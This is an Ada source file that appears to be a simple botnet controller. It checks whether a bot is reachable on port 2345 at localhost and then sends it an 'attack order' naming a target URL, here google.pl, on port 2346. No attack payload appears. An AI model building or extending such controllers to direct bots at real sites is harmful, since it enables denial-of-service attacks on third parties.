with Ada.Text_IO; use Ada.Text_IO;
with GNAT.Sockets; use GNAT.Sockets;
with Ada.Exceptions; use Ada.Exceptions;

procedure main is

	address: Sock_Addr_Type;
	client: Socket_Type;
	channel: Stream_Access;
	targetURI : String := "";
	isSuccessful : boolean;

	procedure initiate_connection (botAddress: in String; portNumber: in Port_Type) is
	begin
		GNAT.Sockets.Initialize;
		Create_Socket (client);
		address.Addr := Inet_Addr(botAddress);
		address.Port := portNumber;

		Connect_Socket (client, address);
		channel := Stream (client);

	end initiate_connection;

	procedure close_connection is
	begin
		Close_Socket (client);
	end close_connection;

	function check_bot_connection (botAddress: in String) return boolean is
	begin
		initiate_connection(botAddress, 2345);
		close_connection;
		return true;
		exception
			when SOCKET_ERROR =>
				return false;
	end check_bot_connection;


	procedure attack_order (botAddress, targetURI: in String) is
	begin
		initiate_connection(botAddress, 2346);
		String'Write(channel, targetURI);
		close_connection;
	end attack_order;


begin

	isSuccessful := check_bot_connection("127.0.0.1");
	if(isSuccessful) then
		put_line("Connected! Sending attack request!");
		attack_order("127.0.0.1", "http://www.google.pl");
		put_line("Attack isSuccessful");
	else
		put_line("Not connected");
		attack_order("127.0.0.1", "http://www.google.pl");
	end if;

end main;
